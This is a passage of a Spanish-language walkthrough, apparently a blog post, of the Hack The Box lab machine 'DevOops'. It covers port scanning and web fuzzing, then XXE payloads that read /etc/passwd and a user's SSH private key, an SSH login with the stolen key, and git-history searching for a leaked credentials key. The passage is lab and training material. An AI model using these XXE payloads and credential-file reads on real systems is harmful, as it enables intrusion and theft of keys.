-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.91 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-10-05 21:47 CDT
-Initiating Ping Scan at 21:47
-Scanning 10.10.10.91 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4 ports]
-Completed Ping Scan at 21:47, 0.18s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Initiating SYN Stealth Scan at 21:47
-Scanning 10.10.10.91 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
-Discovered open port 22/tcp on 10.10.10.91
-Discovered open port 5000/tcp on 10.10.10.91
-Completed SYN Stealth Scan at 21:48, 48.09s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.91
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.18s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-PORT     STATE SERVICE
-22/tcp   open  ssh
-5000/tcp open  upnp
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;48.42 seconds
-           Raw packets sent: 73633 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3.240MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 73411 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.936MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬───────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼───────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.91
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 22,5000
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p22&lt;/span&gt;,5000 10.10.10.91 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-10-05 21:49 CDT
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.91
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.19s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssh-hostkey: 
-|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-5000/tcp open  http    Gunicorn 19.7.1
-|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; charset=utf-8).
-|_http-server-header: gunicorn/19.7.1
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 14.72 seconds
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que tenemos el puerto 5000 abierto bajo el protocolo HTTP; por lo que antes de ver su contenido a través de un explorador, vamos a ver que tecnologías corren con nuestra herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ whatweb http://10.10.10.91:5000/
-http://10.10.10.91:5000/ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Country[RESERVED][ZZ], HTTPServer[gunicorn/19.7.1], IP[10.10.10.91]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;No tenemos nada interesante, así que hora si vamos a ver el contenido web.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-devoops/devoops-web.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Tampco no vemos nada interesante, tanto en el sitio web como en el código fuente. Asi que vamos a tratar de descubrir recursos en el servidor.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ wfuzz &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--hc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;404 &lt;span class=&quot;nt&quot;&gt;--hh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;285 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.91:5000/FUZZ
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&lt;span class=&quot;s1&quot;&gt;'s documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://10.10.10.91:5000/FUZZ
-Total requests: 220560
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                         
-=====================================================================
-
-000000126:   200        1815 L   24122 W    517022 Ch   &quot;feed&quot;                                                          
-000000366:   200        0 L      39 W       347 Ch      &quot;upload&quot;                                                        
-^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
-
-Total time: 0
-Processed Requests: 507
-Filtered Requests: 505
-Requests/sec.: 0
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos dos recursos: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;feed&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upload&lt;/code&gt;; por lo tanto, vamos a echarles un ojo. Vemos que para  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;feed&lt;/code&gt; tenemos el la misma imagen que observamos anteriormente y para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upload&lt;/code&gt; se ve que podemos subir un archivo y nos indican &lt;em&gt;XML elements: Author, Subject, Content&lt;/em&gt;, asi que debe ser un archivo xml que debe contener dichos elementos. Para observar que hace el sitio, vamos a crear un archivo de prueba:&lt;/p&gt;
-
-&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;elements&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;Author&amp;gt;&lt;/span&gt;K4miyo&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Author&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;Subject&amp;gt;&lt;/span&gt;Test&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Subject&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;Content&amp;gt;&lt;/span&gt;Esto es un test&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Content&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/elements&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y vamos a subirlo al servidor:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-devoops/devoops-xml.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que nos nuestra nuestra información de prueba y además tenemos un recurso donde almacena dicho archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/uploads/test.xml&lt;/code&gt;. A este punto ya debemos estar pensando en un &lt;strong&gt;&lt;em&gt;&lt;a href=&quot;https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing&quot;&gt;XXE&lt;/a&gt; (XML External Entity)&lt;/em&gt;&lt;/strong&gt;. Asi que vamos a modificar nuestro archivo para obtener ejecución de comandos a nivel de sistema. (&lt;strong&gt;Nota&lt;/strong&gt;: Para evitar problemas del lado del servidor y que no nos interprete la información, debemos cambiar el nombre del archivo).&lt;/p&gt;
-
-&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo
-  [&amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &amp;gt;&lt;/span&gt;]&amp;gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;elements&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;Author&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Author&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;Subject&amp;gt;&lt;/span&gt;Test&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Subject&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;Content&amp;gt;&lt;/span&gt;Esto es un test&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Content&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/elements&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-devoops/devoops-etc.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Podemos visualizar archivos de sistema, para este caso el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;. Recordando que tenemos el puerto 22 abierto, podríamos tratar de visualizar el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; del usuario &lt;strong&gt;roosa&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE foo [
-  &amp;lt;!ELEMENT foo ANY &amp;gt;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file:///home/roosa/.ssh/id_rsa&quot; &amp;gt;&lt;/span&gt;]&amp;gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;elements&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;Author&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Author&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;Subject&amp;gt;&lt;/span&gt;Test&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Subject&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;Content&amp;gt;&lt;/span&gt;Esto es un test&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Content&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/elements&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-devoops/devoops-idrsa.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nos copiamos dicho archivo y lo guardamos en nuestro directorio de trabajo. Ahora vamos a tratar de ingresar por el puerto 22 como el usuario &lt;strong&gt;roosa&lt;/strong&gt; y hay que recordar que debemos de darle permiso 600 al archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; que hemos identificado para que no nos mande un problema.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa roosa@10.10.10.91
-The authenticity of host &lt;span class=&quot;s1&quot;&gt;'10.10.10.91 (10.10.10.91)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
-ECDSA key fingerprint is SHA256:hbD2D4PdnIVpAFHV8sSAbtM0IlTAIpYZ/nwspIdp4Vg.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '&lt;/span&gt;10.10.10.91&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
-Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-135 packages can be updated.
-60 updates are security updates.
-
-
-The programs included with the Ubuntu system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
-
-roosa@gitter:~$ whoami
-roosa
-roosa@gitter:~$
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A este punto ya nos encontramos dentro del sistema y podemos visualizar la flag (user.txt). Ahora nos queda escalar privilegios, por lo que procedemos a enumerar un poco el sistema.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;roosa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;roosa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;roosa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,27&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-roosa@gitter:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;: unable to resolve host gitter: Connection timed out
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;roosa: 
-roosa@gitter:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
-roosa@gitter:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null
-./bin/ntfs-3g
-./bin/umount
-./bin/su
-./bin/ping6
-./bin/mount
-./bin/ping
-./bin/fusermount
-./usr/bin/chsh
-./usr/bin/vmware-user-suid-wrapper
-./usr/bin/gpasswd
-./usr/bin/pkexec
-./usr/bin/passwd
-./usr/bin/chfn
-./usr/bin/sudo
-./usr/bin/newgrp
-./usr/lib/policykit-1/polkit-agent-helper-1
-./usr/lib/xorg/Xorg.wrap
-./usr/lib/openssh/ssh-keysign
-./usr/lib/dbus-1.0/dbus-daemon-launch-helper
-./usr/lib/snapd/snap-confine
-./usr/lib/eject/dmcrypt-get-device
-./usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
-./usr/sbin/pppd
-roosa@gitter:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que nos encontramos dentro del grupo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;; sin embargo, no contamos con la contraseña del usuario &lt;strong&gt;roosa&lt;/strong&gt;, por lo que poco podemos hacer. Vamos a echarle un ojo al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home&lt;/code&gt; a ver si tenemos algo interesante:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home
-roosa@gitter:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ll
-total 28
-drwxr-xr-x  7 root     root     4096 Mar 26  2021 ./
-drwxr-xr-x 23 root     root     4096 Mar 26  2021 ../
-drwxr-xr-x  2 blogfeed blogfeed 4096 Mar 26  2021 blogfeed/
-drwxr-xr-x  5 git      git      4096 Mar 26  2021 git/
-drwx------  2 root     root     4096 Mar 26  2021 lost+found/
-drwxr-xr-x 16 osboxes  osboxes  4096 Mar 26  2021 osboxes/
-drwxr-xr-x 22 roosa    roosa    4096 Mar 26  2021 roosa/
-roosa@gitter:/home&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos un directorio con nombre curioso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt;, lo que nos haría pensar que se trata de un proyecto de Github; así que vamos a tratar de ver si existen un archivo de extensión &lt;strong&gt;.git&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:/home&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;name &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.git 2&amp;gt;/dev/null
-./roosa/work/blogfeed/.git
-roosa@gitter:/home&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Y vemos que se encuentra en la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/roosa/work/blogfeed/&lt;/code&gt;, ingresamos al directorio y vemos los siguientes archivos.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ll
-total 28
-drwxrwx--- 5 roosa roosa 4096 Mar 26  2021 ./
-drwxrwxr-x 3 roosa roosa 4096 Mar 26  2021 ../
-drwxrwx--- 8 roosa roosa 4096 Mar 26  2021 .git/
-&lt;span class=&quot;nt&quot;&gt;-rw-rw----&lt;/span&gt; 1 roosa roosa  104 Mar 19  2018 README.md
-drwxrwx--- 3 roosa roosa 4096 Mar 26  2021 resources/
-&lt;span class=&quot;nt&quot;&gt;-rwxrw-r--&lt;/span&gt; 1 roosa roosa  180 Mar 21  2018 run-gunicorn.sh&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-drwxrwx--- 2 roosa roosa 4096 Mar 26  2021 src/
-roosa@gitter:~/work/blogfeed&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Como se trata de un proyecto, podriamos utilizar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; para obtener información del mismo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status
-On branch master
-Your branch is up-to-date with &lt;span class=&quot;s1&quot;&gt;'origin/master'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Changes not staged &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;commit:
-  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git add &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to update what will be committed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git checkout -- &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to discard changes &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;working directory&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-        modified:   run-gunicorn.sh
-
-Untracked files:
-  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git add &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to include &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;what will be committed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
-        src/.feed.py.swp
-        src/access.log
-        src/app.py
-        src/app.py~
-        src/config.py
-        src/devsolita-snapshot.png
-        src/feed.log
-        src/feed.pyc
-        src/save.p
-
-no changes added to commit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git add&quot;&lt;/span&gt; and/or &lt;span class=&quot;s2&quot;&gt;&quot;git commit -a&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
-roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log &lt;span class=&quot;nt&quot;&gt;--name-only&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--oneline&lt;/span&gt;
-7ff507d Use Base64 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;pickle feed loading
-src/feed.py
-src/index.html
-26ae6c8 Set PIN to make debugging faster as it will no longer change every &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;the application code is changed. Remember to remove before production use.
-run-gunicorn.sh
-src/feed.py
-cec54d8 Debug support added to make development more agile.
-run-gunicorn.sh
-src/feed.py
-ca3e768 Blogfeed app, initial version.
-src/feed.py
-src/index.html
-src/upload.html
-dfebfdf Gunicorn startup script
-run-gunicorn.sh
-33e87c3 reverted accidental commit with proper key
-resources/integration/authcredentials.key
-d387abf add key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;feed integration from tnerprise backend
-resources/integration/authcredentials.key
-1422e5a Initial commit
-README.md
-roosa@gitter:~/work/blogfeed&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tenemos que para el id &lt;strong&gt;d387abf&lt;/strong&gt; se integró una key y para el id &lt;strong&gt;33e87c3&lt;/strong&gt; se tiene un &lt;em&gt;commit accidentalmente revertido&lt;/em&gt; y nos arroja una ruta de un archivo; asi que vamos a echarle un ojo.&lt;/p&gt;
-
